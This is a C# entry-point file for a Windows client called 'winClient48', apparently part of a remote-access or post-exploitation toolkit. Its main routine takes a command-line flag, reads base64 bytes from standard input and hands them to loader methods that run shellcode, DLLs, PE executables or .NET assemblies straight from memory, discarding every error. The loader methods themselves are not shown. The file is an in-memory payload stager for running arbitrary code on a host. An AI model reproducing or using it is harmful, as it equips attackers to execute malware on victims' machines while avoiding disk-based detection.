using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Threading.Tasks;
using System.Windows.Forms;

using Plugin.Abstractions48;

namespace winClient48
{
    internal static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main(string[] args)
        {
            if (args.Length > 0)
            {
                clsfnLoader loader = new clsfnLoader();

                try
                {
                    if (args[0] == "--sc")
                    {
                        string szB64 = Console.In.ReadToEnd();
                        byte[] abShellcode = Convert.FromBase64String(szB64);

                        loader.fnShellCodeLoader(abShellcode);
                    }
                    else if (args[0] == "--dll")
                    {
                        string szB64 = Console.In.ReadToEnd();
                        byte[] abDllBytes = Convert.FromBase64String(szB64);

                        loader.fnLdrLoadDll(abDllBytes);
                    }
                    else if (args[0] == "--x64")
                    {
                        string szB64 = Console.In.ReadToEnd();
                        byte[] abExe = Convert.FromBase64String(szB64);

                        var ret = loader.fnLoadPeIntoMemory(abExe);
                    }
                    else if (args[0] == "--cs")
                    {
                        string szB64 = Console.In.ReadToEnd();
                        byte[] abDotNetExe = Convert.FromBase64String(szB64);
                        string[] parameters = args.Skip(2).ToArray();

                        loader.fnLoadDotNetExe(abDotNetExe, parameters);
                    }
                }
                catch (Exception ex)
                {

                }
            }
            else
            {
                AppDomain.CurrentDomain.AssemblyResolve += CurrentDomain_AssemblyResolve;

                Application.EnableVisualStyles();
                Application.SetCompatibleTextRenderingDefault(false);
                Application.Run(new Form1(args));
            }
        }

        private static Assembly CurrentDomain_AssemblyResolve(object sender, ResolveEventArgs args)
        {
            var name = new AssemblyName(args.Name).Name;
            if (name == "Plugin.Abstractions48")
            {
                return typeof(IPlugin).Assembly;
            }

            return null;
        }
    }
}
